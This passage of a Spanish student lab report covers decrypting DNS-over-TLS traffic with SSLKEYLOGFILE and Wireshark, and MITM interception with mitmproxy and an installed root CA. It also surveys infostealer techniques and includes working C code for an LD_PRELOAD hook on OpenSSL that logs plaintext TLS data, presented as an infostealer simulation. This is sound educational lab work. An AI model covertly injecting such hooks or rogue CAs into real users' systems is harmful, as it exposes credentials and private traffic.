<li>Paquete 31: <code>Finished</code>: Es el mensaje que cierra el handshake del servidor, verificación de integridad del transcript.</li>
<li>Autenticación: <code>Certificate</code> + <code>Certificate Verify</code> con ECDSA P-256 / SHA-256.</li>
</ul>
<p><mark>También podemos ver el éxito del descifrado en el paquete 4 Client Hello con la extensión SNI configurada hacia <code>one.one.one.one</code>, que garantiza la integridad del handshake mediante la selección del certificado adecuado.</mark><br>
<img src="capturas/tarea3-modulo5-sni.png" alt="tarea3-modulo5-sni"></p>
<p><mark>En el paquete 14 Wireshark vemos una respuesta <code>DNS (ID 0x9049)</code> asociada a la consulta del paquete 12 <code>Request In: 12</code>, con estado <code>NOERROR</code> y <code>dos registros A</code> para el dominio <code>example.com</code>, <code>104.18.26.120</code> y <code>104.18.27.120</code>. Esto confirma que la sesión TLS se ha descifrado correctamente con el <code>key log</code>:</mark><br>
<img src="capturas/tarea3-modulo5-sslkeylogfile-5.png" alt="tarea3-modulo5-sslkeylogfile-5.png"></p>
<div style="page-break-before: always;"></div>
<h2 id="intercepci%C3%B3n-activa-con-proxy-tls---mitm"><strong>Intercepción activa con proxy TLS - MITM</strong></h2>
<p>La idea para poder realizar este tipo de captura del tráfico TLS:</p>
<ul>
<li>Poner un proxy TLS en el medio, como por ejemplo Mitmproxy, Burp Suite o Fiddler. Elegimos mitmproxy.</li>
<li>Instalar la CA del proxy en el Almacén de Certificados Raíz de Confianza de nuestro sistema operativo o navegador.</li>
<li>Hacer que el cliente DoT se conecte al proxy en vez de al servidor real. Esto se suele hacer de dos formas:
<ul>
<li>Configuración directa: Configurando el proxy en la aplicación o mediante variables de entorno.</li>
<li>Con IPTables: Forzando a nivel de red que todo lo que vaya al puerto 853 sea desviado hacia el puerto donde escucha mitmproxy.</li>
</ul>
</li>
</ul>
<p><mark>Mediante la inserción de una Autoridad de Certificación (CA) controlada en el almacén de confianza del sistema, se permite que mitmproxy genere certificados dinámicos válidos para <code>one.one.one.one</code>. Esto permite la inspección y modificación del tráfico DoT en tiempo real, antes de que sea re-cifrado hacia la infraestructura de Cloudflare.</mark></p>
<br>
<h3 id="entendiendo-que-es-un-proxy-tls---mitm-con-ca-propia"><strong>Entendiendo que es un proxy TLS - MITM con CA propia</strong></h3>
<p>Un proxy TLS de inspección actúa como <code>man in the middle</code>, terminando TLS del lado cliente y creando otra sesión TLS hacia el servidor real:</p>
<ul>
<li>Cliente ↔ Proxy: TLS con un certificado falso para el hostname destino, firmado por nuestro CA: nuestro <code>Root CA</code>.</li>
<li>Proxy ↔ Servidor real: TLS normal con el certificado legítimo del servidor.</li>
<li>El proxy puede ver el contenido en claro en el punto intermedio.</li>
<li>Condición crítica: El cliente sólo aceptará el MITM si confía en la CA que firma ese certificado falso.</li>
</ul>
<p>En este caso, estamos actuando como un traductor en tiempo real entre el cliente y el servidor, permitiendo no sólo ver el tráfico, sino también modificarlo.</p>
<div style="page-break-before: always;"></div>
<h3 id="instalaci%C3%B3n-de-la-autoridad-de-certificaci%C3%B3n---ca"><strong>Instalación de la Autoridad de Certificación - CA</strong></h3>
<p><strong>Instalamos Mitmproxy:</strong></p>
<pre class="hljs"><code><div>sudo apt install mitmproxy
</div></code></pre>
<br>
<p><strong>Creamos los certificados CA de Mitmproxy:</strong> Mitmproxy no crea sus certificados hasta que se ejecuta por primera vez. Para ello:</p>
<ul>
<li>Abrimos una terminal y escribimos <code>mitmproxy</code>.</li>
<li>Una vez que se abre la interfaz, los certificados se habrán generado automáticamente en una carpeta oculta de nuestro usuario linux: <code>~/.mitmproxy/</code>
<img src="capturas/tarea3-modulo5-mitmproxy.png" alt="tarea3-modulo5-mitmproxy.png"></li>
</ul>
<br>
<p><strong>Obtención del Certificado:</strong> Vemos en la carpeta <code>~/.mitmproxy/</code>:
<img src="capturas/tarea3-modulo5-mitmproxy-2.png" alt="tarea3-modulo5-mitmproxy-2.png">
donde:</p>
<ul>
<li><code>mitmproxy-ca-cert.pem</code>: Es el certificado público de la entidad emisora (CA). Es el estándar para sistemas Linux y navegadores como Firefox.</li>
<li><code>mitmproxy-ca-cert.p12</code>: Se usa principalmente para instalar en dispositivos Windows, iOS o Android.</li>
</ul>
<br>
<p><strong>Instalación de la CA del proxy en el Almacén de Certificados Raíz de Confianza de nuestro sistema:</strong> Copiamos el archivo <code>mitmproxy-ca-cert.pem</code> a la carpeta de certificados del sistema renombrándolo y actualizamos el almacén del sistema:</p>
<pre class="hljs"><code><div>sudo cp ~/.mitmproxy/mitmproxy-ca-cert.pem /usr/local/share/ca-certificates/mitmproxy.crt
sudo update-ca-certificates
</div></code></pre>
<p><img src="capturas/tarea3-modulo5-mitmproxy-3.png" alt="tarea3-modulo5-mitmproxy-3.png"></p>
<p>Resumiendo: <mark>Sin este paso, en el apartado de &quot;Handshake TLS&quot;, el cliente rechazaría la Cipher Suite o el Certificado del servidor porque el Issuer (emisor) sería desconocido. Al instalar la CA, el sistema tratará los certificados falsos de mitmproxy como si fueran legítimos, permitiéndonos ver los Datos que son cifrados como texto crudo.</mark></p>
<br>
<p><strong>Verificamos que mitmproxy funciona correctamente:</strong></p>
<ul>
<li>
<p>En firefox:</p>
<ul>
<li>Ajustes -&gt; General -&gt; Configuración de red.</li>
<li>Seleccionamos &quot;Configuración manual del proxy&quot;.</li>
<li>Ponemos HTTP Proxy: 127.0.0.1 y Puerto: 8080. Marcamos la casilla &quot;Usar este servidor proxy también para HTTPS&quot;.</li>
<li>Vemos que aún el tráfico no pasa por mitmproxy:
<img src="capturas/tarea3-modulo5-mitmproxy-4.png" alt="tarea3-modulo5-mitmproxy-4"></li>
</ul>
</li>
<li>
<p>Instalamos el certificado en firefox:</p>
<ul>
<li>Ajustes -&gt; Privacidad y seguridad -&gt; Certificados -&gt; Ver certificados</li>
<li>En la pestaña de Autoridades: Importar y seleccionar el archivo del proxy <code>mitmproxy-ca-cert.pem</code>.</li>
<li>Configuramos la confianza: Se abrirá una ventana con dos casillas. Debemos marcar obligatoriamente: <code>Confiar en esta CA para identificar sitios web</code>.
<img src="capturas/tarea3-modulo5-mitmproxy-5.png" alt="tarea3-modulo5-mitmproxy-5"></li>
</ul>
</li>
</ul>
<p><img src="capturas/tarea3-modulo5-mitmproxy-6-ok.png" alt="tarea3-modulo5-mitmproxy-6"><br>
La terminal ya muestra flujos de tráfico HTTPS en color verde (200 OK) para dominios como Google y Mozilla. Esto confirma que la intercepción activa (MITM) ya está funcionando correctamente y Firefox confía en tu certificado.</p>
<p>Vemos que en Firefox ya sí funciona también mitmproxy:<br>
<img src="capturas/tarea3-modulo5-mitmproxy-7.png" alt="tarea3-modulo5-mitmproxy-7"></p>
<div style="page-break-before: always;"></div>
<h3 id="redirecci%C3%B3n-del-tr%C3%A1fico"><strong>Redirección del tráfico</strong></h3>
<p>Debemos asegurarnos de que los paquetes pasen por el proxy.</p>
<ul>
<li>Proxy de sistema: Configuramos la IP y el puerto del proxy en los ajustes de red de nuestro equipo.</li>
<li>DoT (Puerto 853): Si estamos analizando la sesión de Cloudflare en el puerto 853, debemos asegurarnos de que nuestro proxy soporte tráfico transparente o esté configurado específicamente para escuchar en ese puerto. Ejecutaremos el comando mitmproxi con las siguientes opciones:</li>
</ul>
<pre class="hljs"><code><div>mitmproxy --mode 'reverse:https://1.0.0.1:853' --rawtcp listen-host 0.0.0.0 --listen-port 853
</div></code></pre>
<p>donde:</p>
<ul>
<li><code>--mode 'reverse:https://1.0.0.1:853'</code>: Configura el modo proxy inverso. En lugar de que el cliente sepa que hay un proxy, este comando hace que mitmproxy cualquier conexión que reciba, la descífra y la reenvía mediante TLS (https) al servidor real en 1.0.0.1:853.</li>
<li><code>--rawtcp</code>: Esta opcion hace que mitmproxy no se bloquee cuando recibe algo que no es HTTP, simplemente lo descifra y lo pasa.</li>
<li><code>--listen-host 0.0.0.0</code>: Indica que el proxy debe escuchar en todas las interfaces de red disponibles de la máquina virtual.</li>
<li><code>--listen-port 853</code>: Obliga a mitmproxy a escuchar en el puerto estándar de DNS-over-TLS.</li>
</ul>
<br>
<h3 id="generaci%C3%B3n-de-tr%C3%A1fico-dot-con-kdig"><strong>Generación de tráfico DoT con kdig</strong></h3>
<p>Ejecutamos el comando:</p>
<pre class="hljs"><code><div>kdig -d @1.1.1.1 +tls-ca=~/.mitmproxy/mitmproxy-ca-cert.pem +tls-hostname=one.one.one.one cloudflare.com
</div></code></pre>
<p>donde:</p>
<ul>
<li><code>@127.0.0.1 -p 8080</code>: No nos conectamoss a Cloudflare directamente. Nos conectamos a un servicio local, el proxy.</li>
<li><code>+tls-ca=mitmproxy-ca-cert.pem</code>: Indicamos a kdig que confíe en esa CA que es la CA de nuestro proxy.</li>
<li><code>+tls-host=one.one.one.one</code>: Fuerza SNI/validación para ese hostname.</li>
<li>Resultado: kdig acepta el certificado que le presenta el proxy porque está firmado por nuestra CA.</li>
</ul>
<p>Obtenemos una intercepción activa (MITM) exitosa en el sentido de validación de CA propia:
<img src="capturas/tarea3-modulo5-mitmproxy-8.png" alt="tarea3-modulo5-mitmproxy-8.png">
donde:</p>
<ul>
<li>En la ventana de terminal de mitmproxy:
<ul>
<li>Se ve un flujo TCP 127.0.0.1:33699 &lt;-&gt; 1.0.0.1:853.</li>
<li>Eso es la prueba de que el proxy está haciendo “puente” hacia el DoT real de Cloudflare en 853.</li>
<li><mark>Hemos conseguido exactamente lo que pedía el apartado de “intercepción activa”: el cliente habla TLS con el proxy, y el proxy habla TLS con Cloudflare.</mark></li>
</ul>
</li>
<li>En la ventana de terminal de kdig:
<ul>
<li><code>DEBUG: TLS, imported 1 certificates from 'mitmproxy-ca-cert.pem</code>: <mark>Al forzar a kdig a importar el certificado de mitmproxi como su autoridad de confianza, estamos confirmando que el emisor (Issuer) del certificado que recibirá a continuación no es una entidad pública como SSL.com, sino el CA propio proxy.</mark></li>
<li><code>#1, CN=cloudflare-dns.com, O=Cloudflare, Inc.</code>: El proxy genera un certificado con el mismo CN/SAN esperado, para que el cliente no sospeche por nombre. <mark>Lo importante para demostrar MITM es el Issuer, el emisor:</mark>
<ul>
<li><mark>En conexión directa (sin MITM) antes veíamos cadena pública (SSL.com …).</mark></li>
<li><mark>En MITM vemos que el Issuer ya no es SSL.com, sino nuestro CA mitmproxy.</mark></li>
</ul>
</li>
<li><mark>Aunque kdig no muestra el ISSUER, lo importante es que se ve que se confía en la CA de mitmproxy y por eso el TLS con el proxy pasa:</mark>
<ul>
<li><mark>TLS, imported 1 certificates from mitmproxy-ca-cert.pem.</mark></li>
<li><mark><code>The certificate is trusted</code>: Confirma que el certificado generado por el proxy ha pasado la validación interna del cliente gracias al paso anterior.</mark></li>
<li><mark>From 127.0.0.1@8080(TLS): Esta es la dirección de nuestro proxy local. Sin el MiM veriamos: 1.0.0.1@853</mark></li>
</ul>
</li>
</ul>
</li>
</ul>
<div style="page-break-before: always;"></div>
<ul>
<li><code>TLS session (TLS1.3)-(ECDHE-SECP256R1)-(RSA-PSS-RSAE-SHA256)-(AES-256-GCM)</code>:
<ul>
<li>TLS1.3: versión negociada.</li>
<li>ECDHE-SECP256R1: el intercambio de claves efímero usa P-256 (secp256r1).
NOTA: Antes con Cloudflare directo aparecía X25519; aquí cambia porque el endpoint TLS “servidor” ahora es el proxy. Es importante este detalle, ya que es un indicador extra de que estamos terminando TLS en otro sitio, en el proxy, no con Cloudflare.</li>
<li>RSA-PSS-RSAE-SHA256: algoritmo de firma usado en CertificateVerify (autenticación del servidor).</li>
<li>AES-256-GCM: cifrado simétrico AEAD.</li>
</ul>
</li>
<li>DNS: La resolución:
<ul>
<li>cloudflare.com → 104.16.133.229 y 104.16.132.229</li>
<li><mark>From 127.0.0.1@8080(TLS) confirma que para kdig el “servidor DoT” es el proxy local.</mark></li>
</ul>
</li>
</ul>
<br>
<h3 id="an%C3%A1lisis-tras-la-intercepci%C3%B3n-en-mitmproxy"><strong>Análisis tras la intercepción en mitmproxy</strong></h3>
<p><strong>Seleccionamos un flujo TCP:</strong></p>
<ul>
<li>En la ventana del terminal de mitmproxy, seleccionamos un flujo TCP.
<img src="capturas/tarea3-modulo5-mitmproxy-11.png" alt="tarea3-modulo5-mitmproxy-11.png"></li>
<li>Usamos las flechas para situarnos sobre una línea que empieza por TCP y tiene como destino 1.0.0.1:853.</li>
<li>Pulsamos la tecla Enter para entrar en ese flujo concreto:
<img src="capturas/tarea3-modulo5-mitmproxy-10.png" alt="tarea3-modulo5-mitmproxy-10.png"></li>
<li>Usamos la tecla Tab o las flechas izquierda/derecha para movernos hasta la pestaña Detail.</li>
</ul>
<p><strong>Dentro de la pestaña Detail:</strong>
<img src="capturas/tarea3-modulo5-mitmproxy-9.png" alt="tarea3-modulo5-mitmproxy-.png">
donde:</p>
<ul>
<li>Apartado: Transporte / Socket: Se muestra toda la información del &quot;tubo&quot; por el que viajan los datos:
<ul>
<li>Protocolo: <code>TCP (SOCK_STREAM)</code>.</li>
<li>Dirección y Puerto: <code>1.0.0.1:853</code>.</li>
<li>Handshake TCP: Se confirma como exitoso porque la conexión llegó a establecerse en 62ms.</li>
</ul>
</li>
<li>Apartado: Handshake <code>TLS: Sección &quot;Client Connection&quot;</code>.
<ul>
<li>Versión negociada: <code>TLSv1.3</code>.</li>
<li>Cipher suite negociada: TLS_AES_256_GCM_SHA384.</li>
<li>Extensiones relevantes (SNI): <code>one.one.one.one</code>.</li>
</ul>
</li>
<li>Apartado: Certificado del Servidor: En la sección &quot;Server Certificate&quot; se muestran los detalles de validación:
<ul>
<li><code>Subject / SAN: cloudflare-dns.com, one.one.one.one</code>, etc.</li>
<li>Validación (<code>OK / trusted</code>): En la captura anterior vimos que el comando kdig confirmó: <code>The certificate is trusted</code>.</li>
<li><code>Trusted</code> porque instalamos manualmente la CA de mitmproxy en el almacén de confianza.</li>
</ul>
</li>
</ul>
<div style="page-break-before: always;"></div>
<h3 id="vemos-el-tr%C3%A1fico-de-aplicaci%C3%B3n-descifrado"><strong>Vemos el Tráfico de aplicación descifrado</strong></h3>
<ul>
<li>
<p><strong>TCP Stream:</strong> Dentro de la pestaña TCP Steam: Pulsamos la flecha Izquierda para movernos de la pestaña &quot;Datail&quot; a la pestaña &quot;TCP Stream&quot;. Ahí vemos los bytes reales. Como es DNS over TLS, vemos el nombre del dominio que consultamos con kdig, <code>cloudflare.com</code> en texto claro:
<img src="capturas/tarea3-modulo5-mitmproxy-10.png" alt="tarea3-modulo5-mitmproxy-10.png">
donde:</p>
<ul>
<li><marK>Es la prueba de que ocurre el descifado: Para que podamos ver el nombre del dominio, <code>cloudflare.com</code>, el proxy ha tenido que descifrar el paquete que le envió kdig. Si no lo descifrara, el proxy sólo vería bytes aleatorios ilegibles.</marK></li>
</ul>
</li>
<li>
<p><strong>Cipher Name:</strong> Vamos a la pestaña Details. Vemos <code>Cipher name: TLS_AES_256_GCM_SHA384</code>:<br>
<img src="capturas/tarea3-modulo5-mitmproxy-12.png" alt="tarea3-modulo5-mitmproxy-12.png"><br>
donde:</p>
<ul>
<li><marK>En una conexión normal de TLSv1.3, gran parte de la negociación final y los certificados están cifrados. El hecho de que mitmproxy muestre explícitamente que se negoció el algoritmo <code>TLS_AES_256_GCM_SHA384</code> es prueba de que el proxy ha participado activamente en el saludo (handshake).</marK></li>
</ul>
</li>
<li>
<p><strong>Certificado del Servidor:</strong> Dentro de la pestaña Details:
<img src="capturas/tarea3-modulo5-mitmproxy-13.png" alt="tarea3-modulo5-mitmproxy-13.png">
donde:</p>
<ul>
<li>Vemos en el Subject <code>CN=cloudflare-dns.com</code>.</li>
<li>Vemos en el Issuer <code>SSL.com</code>.</li>
<li><marK>En TLS 1.3, el certificado que envía el servidor viaja cifrado. Si mitmproxy no hubiera descifrado la sesión, sería incapaz de mostrar esos campos de texto claro.</marK></li>
</ul>
</li>
</ul>
<p><strong>Nota aclaratoria importante sobre los certificados: Aclaraciones entre el Falso y el Real</strong></p>
<ul>
<li>Certificado Real (Upstream): Emitido por SSL.com a Cloudflare. Es el que mitmproxy analiza para clonar sus datos (como el SNI one.one.one.one).</li>
<li>Certificado Falso: Emitido por mi CA de mitmproxy a kdig. Es el que permite que pueda ver el tráfico descifrado.</li>
<li>Al decirle a kdig que confíe en mitmproxy-ca-cert.pem, y recibir un &quot;Trusted&quot;, queda demostrado que el certificado que recibió kdig estaba firmado por mi CA.</li>
</ul>
<p>En el tramo proxy↔servidor se observa el certificado público real de Cloudflare, cuya cadena es validada por el proxy contra una CA pública (<code>SSL.com</code>). En cambio, en el tramo cliente↔proxy, la validación exitosa de kdig indica que el certificado presentado al cliente no es el original, sino uno generado dinámicamente por el proxy para el hostname usado en SNI/validación (<code>one.one.one.one</code>) y re-firmado con la CA local en la que kdig confía (<code>+tls-ca=mitmproxy-ca-cert.pem</code>). Esto permite al proxy terminar TLS, acceder al contenido de aplicación en claro y volver a cifrarlo hacia el servidor real.</p>
<h3 id="el-tr%C3%A1fico-en-wireshark"><strong>El tráfico en wireshark</strong></h3>
<p>Si capturamos el tráfico que se generó con el comando kdig y lo intentamos analizar con wireshark, veremos que continúa mostrando tráfico cifrado. Para Wireshark, lo que viaja entre la IP de la máquina virtual 10.0.2.15 y el servidor 1.0.0.1 es un flujo de datos protegidos:
<img src="capturas/tarea3-modulo5-mitmproxy-14.png" alt="tarea3-modulo5-mitmproxy-14.png"></p>
<p><mark>Mientras que mitmproxy permite visualizar el contenido descifrado de la consulta DNS gracias a la intercepción activa del socket, la captura de Wireshark demuestra que el tráfico en tránsito sigue estando protegido por TLS 1.3. Como no le hemos proporcionado el archivo de secretos, Wireshark no tiene forma de abrir esos paquetes y por eso lo etiqueta genéricamente como <code>Application Data</code>.</mark></p>
<p>Podríamos combinar esta técnica, con la técnica de Registro de Claves de Sesión - Key Logging (que vimos en el apartado anterior) para entonces poder ver los paquetes decifrados en wireshark.</p>
<div style="page-break-before: always;"></div>
<h1 id="6-bonus-track"><strong>6. Bonus Track</strong></h1>
<h2 id="61-t%C3%A9cnicas-de-descrifrado-de-tls"><strong>6.1 Técnicas de descrifrado de TLS</strong></h2>
<h3 id="t%C3%A9cnica-1-descifrado-pasivo-mediante-registro-de-claves"><strong>Técnica 1: Descifrado pasivo mediante registro de claves</strong></h3>
<p>Esta técnica se basa en obtener las &quot;llaves maestras&quot; que genera el cliente durante la negociación TLS.</p>
<ul>
<li>
<p>Cómo funciona: El cliente, como Firefox o kdig, guarda los secretos de la sesión en un archivo de texto (el famoso SSLKEYLOGFILE).</p>
</li>
<li>
<p>Wireshark: Wireshark no intercepta la conexión, solo &quot;mira&quot; los paquetes pasar. Al darle el archivo de claves, Wireshark puede abrir el candado de los paquetes que ya capturó anteriormente.</p>
</li>
<li>
<p>Resultado: Vemos el protocolo interno (DNS) en lugar de &quot;Application Data&quot;.</p>
</li>
</ul>
<h3 id="t%C3%A9cnica-2-descifrado-activo-mediante-intercepci%C3%B3n-mit"><strong>Técnica 2: Descifrado activo mediante Intercepción MiT</strong></h3>
<ul>
<li>
<p>Cómo funciona: En lugar de dejar que el cliente hable con el servidor real, el proxy se pone en medio y &quot;rompe&quot; el túnel TLS en dos partes.</p>
<ul>
<li>Túnel 1: El cliente habla con el Proxy. El proxy descifra los datos aquí.</li>
<li>Túnel 2: El proxy habla con el Servidor real. El proxy vuelve a cifrar los datos aquí.</li>
</ul>
</li>
<li>
<p>Por qué es descifrado: Para que podemos ver el nombre del dominio (cloudflare.com) o la Cipher Suite en la pantalla de mitmproxy, el proxy ha tenido que descifrar el paquete que le envió kdig. Si no lo descifrara, el proxy solo vería bytes aleatorios ilegibles.</p>
</li>
</ul>
<h3 id="t%C3%A9cnica-3-clave-privada-del-servidor"><strong>Técnica 3: Clave privada del servidor</strong></h3>
<ul>
<li>Requisito: tener la clave privada del certificado del servidor.</li>
<li>Uso típico en laboratorio: montar un proxy inverso con ese certificado y desviar el tráfico hacia él.</li>
<li>Límite importante: con TLS moderno y ECDHE, la clave privada ya no permite descifrar capturas pasadas; sirve sobre todo para hacerse pasar por el servidor y ver el tráfico en vivo.</li>
</ul>
<h3 id="t%C3%A9cnica-4-compromiso-del-endpoint-servidor"><strong>Técnica 4: Compromiso del endpoint servidor</strong></h3>
<p>Se instala un agente/malware en el servidor que:</p>
<ul>
<li>Hookea la librería TLS (OpenSSL, NSS, SChannel, etc.) para ver datos antes de cifrar o después de descifrar.</li>
<li>O directamente lee memoria de proceso donde están los secretos o el texto plano.</li>
<li>Requiere: controlar el servidor.</li>
</ul>
<p>Es más explotación de endpoint que de red, pero a efectos prácticos tambien permite ver todo el tráfico TLS descifrado.</p>
<div style="page-break-before: always;"></div>
<h3 id="t%C3%A9cnica-5-compromiso-del-endpoint-cliente"><strong>Técnica 5: Compromiso del endpoint cliente</strong></h3>
<p>Esta técnica se conoce técnicamente como Exfiltración de Secretos de Sesión y es una de las más sigilosas, ya que no rompe el cifrado mediante fuerza bruta, sino que simplemente &quot;roba la llave&quot; mientras el usuario legítimo la está usando. Si se obtiene acceso al proceso, se pueden extraer secretos de sesión y descifrar.</p>
<p><strong>Familias de malware que utilizan este fin:</strong></p>
<ul>
<li>
<p>Infostealers (Ladrones de Información): Son los más comunes hoy en día. Su objetivo no es romper el sistema, sino extraer credenciales y secretos de la memoria de los navegadores.</p>
<ul>
<li>
<p>RedLine Stealer / Vidar: Estos malwares escanean la memoria de procesos como chrome.exe o firefox.exe para buscar archivos de cookies y, en versiones avanzadas, intentan capturar los Master Secrets de TLS para descifrar comunicaciones bancarias o de criptoactivos.</p>
<ul>
<li>https://bazaar.abuse.ch/browse.php?search=tag%3ARedLineStealer</li>
<li>https://bazaar.abuse.ch/browse.php?search=tag%3AVidar</li>
</ul>
</li>
<li>
<p>StealC: Un malware moderno que automatiza la extracción de datos de navegadores, aprovechando que muchas aplicaciones guardan secretos temporales en memoria para mejorar el rendimiento. https://bazaar.abuse.ch/browse.php?search=tag%3AStealC</p>
</li>
</ul>
</li>
<li>
<p>Memory scrapers: malware que busca en RAM patrones (claves, tokens, credenciales) y los exfiltra.</p>
</li>
<li>
<p>Troyanos Bancarios (Banking Trojans): Estos son especialistas en la interceptación de tráfico de red.</p>
<ul>
<li>Dridex / Qakbot (Qbot): Utilizan una técnica llamada Browser Hooking. Inyectan código malicioso en las librerías de red del navegador (como nss3.dll en Firefox o schannel.dll en Windows). Al estar &quot;dentro&quot; de la librería, pueden leer los datos justo antes de que se cifren o justo después de descifrarse, haciendo que el TLS sea totalmente inútil.
<ul>
<li>https://bazaar.abuse.ch/browse.php?search=tag%3AQakbot</li>
<li>https://bazaar.abuse.ch/browse.php?search=tag%3Adridex</li>
</ul>
</li>
</ul>
</li>
<li>
<p>Malware que manipula SSLKEYLOGFILE: Esta variable de entorno es una herramienta de depuración legítima. Sin embargo:</p>
<ul>
<li>
<p>Malware de persistencia: Algunos atacantes no instalan un troyano complejo, sino que simplemente configuran la variable de entorno SSLKEYLOGFILE en el sistema de la víctima de forma oculta.</p>
</li>
<li>
<p>Efecto: A partir de ese momento, cada vez que la víctima usa el navegador, este guarda automáticamente todas las llaves de descifrado en un archivo oculto que el malware luego envía al servidor del atacante (C2).</p>
</li>
</ul>
</li>
</ul>
<div style="page-break-before: always;"></div>
<h2 id="62-aplicaci%C3%B3n-de-la-t%C3%A9cnica-5-hook-a-la-librer%C3%ADa-tls"><strong>6.2 Aplicación de la Técnica 5: Hook a la librería TLS</strong></h2>
<p>Vamos a ampliar el ámbito de esta práctica. Intentaremos utilizar esta técnica para 5 para practicar descifrando tráfico TLS. Simularemos el comportamiento de un Infostealer moderno. El objetivo es realizar un Hooking, interceptación de funciones, a la librería criptográfica GnuTLS que identificamos en un apartado anterior.</p>
<p>A diferencia de los métodos anteriores, esta técnica no analiza el tráfico en la red, sino que extrae la información directamente desde la memoria del proceso. Esto permite:</p>
<ul>
<li>Capturar el payload DNS en texto claro justo antes de ser cifrado para su envío o inmediatamente después de ser descifrado al recibir la respuesta.</li>
<li>Evadir la inspección de red, ya que la interceptación ocurre dentro del espacio de memoria de la aplicación (kdig), donde el cifrado TLS aún no ha protegido los datos.</li>
<li>Simular una exfiltración sigilosa, demostrando cómo un atacante con acceso al sistema puede comprometer la privacidad del protocolo DoT sin necesidad de romper algoritmos criptográficos complejos como x25519.</li>
</ul>
<br>
<h3 id="implementaci%C3%B3n-de-la-librer%C3%ADa-ssl-hookc"><strong>Implementación de la librería ssl hook.c</strong></h3>
<p>Esta librería define funciones con el mismo nombre y firma que las funciones reales de las librerías criptográficas (como <code>SSL_read</code> y <code>SSL_write</code> en OpenSSL, o <code>gnutls_record_recv</code> en GnuTLS). Cuando una aplicación intenta enviar o recibir datos, el sistema operativo es &quot;engañado&quot; mediante <code>LD_PRELOAD</code> para que ejecute nuestra versión fake de la función en lugar de la oficial.</p>
<p>Una vez que la librería se ha inyectado con éxito en el espacio de memoria del proceso, se obtiene acceso directo a los buffers de datos en texto claro, operando en tres fases críticas:</p>
<ul>
<li>Intercepción en el Envío: Captura el contenido de los paquetes justo antes de que se ejecuten los algoritmos de cifrado de la librería criptográfica (OpenSSL/GnuTLS).</li>
<li>Intercepción en la Recepción: Captura la información en el momento exacto en que la librería real termina de descifrar los bytes recibidos de la red, garantizando acceso a los datos antes de que lleguen a la lógica interna de la aplicación.</li>
<li>Persistencia y Exfiltración (El Log): Los bytes interceptados se vulcan de forma asíncrona hacia un archivo o tubería (FIFO) en <code>/tmp/ssl_intercept.log</code>. Este mecanismo permite que herramientas externas de análisis dinámico, como un script Python que se desarrollará en el siguiente apartado, procesen, etiqueten y visualicen el tráfico en tiempo real.</li>
</ul>
<p>Para que la aplicación no se bloquee ni sospeche que algo va mal, la librería utiliza la función <code>dlsym(RTLD_NEXT, ...)</code>. Esto le permite encontrar la dirección de memoria de la función original y verdadera. Después de copiar los datos para el log, esta librería fake llama a la función real para que la comunicación continúe normalmente hacia el servidor.</p>
<div style="page-break-before: always;"></div>
<h3 id="c%C3%B3digo-fuente-ssl-hookc"><strong>Código Fuente: ssl hook.c</strong></h3>
<p>El fichero <code>ssl_hook.c</code>:</p>
<pre class="hljs"><code><div>#define _GNU_SOURCE
#include &lt;stdio.h&gt;
#include &lt;dlfcn.h&gt;
#include &lt;openssl/ssl.h&gt;
#include &lt;unistd.h&gt;
#include &lt;fcntl.h&gt;

// Punteros para almacenar las funciones originales de OpenSSL
static int (*real_SSL_read)(SSL *ssl, void *buf, int num) = NULL;
static int (*real_SSL_write)(SSL *ssl, const void *buf, int num) = NULL;

// Función auxiliar para registrar los datos interceptados en un fichero
void log_data(const char *prefix, const void *buf, int num) {
    int fd = open(&quot;/tmp/ssl_intercept.log&quot;, O_WRONLY | O_APPEND | O_CREAT, 0644);
    if (fd != -1) {
        write(fd, prefix, 10);
        write(fd, buf, num);
        write(fd, &quot;\n---\n&quot;, 5);
        close(fd);
    }
}

// Interceptación de SSL_write (Datos antes de ser cifrados)
int SSL_write(SSL *ssl, const void *buf, int num) {
    if (!real_SSL_write) {
        real_SSL_write = dlsym(RTLD_NEXT, &quot;SSL_write&quot;);
    }
    
    // Memory Scraping: Capturamos el buffer antes de enviarlo a la función real
    log_data(&quot;[WRITE]   &quot;, buf, num);
    
    return real_SSL_write(ssl, buf, num);
}

// Interceptación de SSL_read (Datos después de ser descifrados)
int SSL_read(SSL *ssl, void *buf, int num) {
    if (!real_SSL_read) {
        real_SSL_read = dlsym(RTLD_NEXT, &quot;SSL_read&quot;);
    }

    // Llamamos a la función real para que OpenSSL haga el descifrado
    int result = real_SSL_read(ssl, buf, num);

    // Si la lectura fue exitosa, registramos el buffer ya descifrado
    if (result &gt; 0) {
        log_data(&quot;[READ ]   &quot;, buf, result);
    }

    return result;
}
</div></code></pre>
<h3 id="compilaci%C3%B3n"><strong>Compilación</strong></h3>
<p>Compilación como una librería compartida:</p>
<pre class="hljs"><code><div>gcc -shared -fPIC -o ssl_hook.so ssl_hook.c -ldl
</div></code></pre>
<br>
<h3 id="t%C3%A9cnica-de-api-spoofing-v%C3%ADa-ld-preload"><strong>Técnica de API Spoofing vía LD PRELOAD</strong></h3>
<p><strong>La técnica conocida como API Hooking o Inyección de Librerías en Tiempo de Ejecución:</strong> Su objetivo no es interceptar el tráfico en el cable, sino &quot;secuestrar&quot; las funciones de red dentro de la memoria RAM del propio programa.</p>
<p>Uso de la técnica API Hooking:</p>
<pre class="hljs"><code><div>LD_PRELOAD=./ssl_hook.so curl https://www.google.com
</div></code></pre>
<p>donde:</p>
<ul>
<li><code>LD_PRELOAD</code>: Es una variable de entorno del cargador dinámico de Linux. Le indica al sistema que antes de cargar las librerías estándar (como OpenSSL) debe cargar obligatoriamente las librerías que le indicamos.</li>
<li><code>./ssl_hook.so</code>: Es el archivo binario que compilamos desde el código en C. Contiene las versiones &quot;falsas&quot; de las funciones SSL_read y SSL_write.</li>
<li><code>curl https://www.google.com</code>: Es la aplicación víctima. curl cree que está funcionando normalmente, sin saber que sus herramientas de cifrado han sido sustituidas.</li>
<li><code>curl</code> llamaría directamente a la librería oficial de OpenSSL. Con este comando, el flujo cambia radicalmente:
<ul>
<li>La llamada: curl necesita enviar datos a Google y llama a la función <code>SSL_write</code>.</li>
<li>El desvío: Gracias a <code>LD_PRELOAD</code>, el sistema no va a OpenSSL, sino que ejecuta la función <code>SSL_write</code> dentro de <code>ssl_hook.so</code>.</li>
<li>El espionaje (Memory Scraping): Nuestra función toma el mensaje en texto claro, antes de que sea cifrado, lo copia y lo escribe en el archivo <code>/tmp/ssl_intercept.log</code>.</li>
<li>Para que curl no sospeche y la conexión no se rompa, la librería usa <code>dlsym(RTLD_NEXT, ...)</code> para pasarle el mensaje a la función real de OpenSSL y que esta lo envíe a Internet.</li>
</ul>
</li>
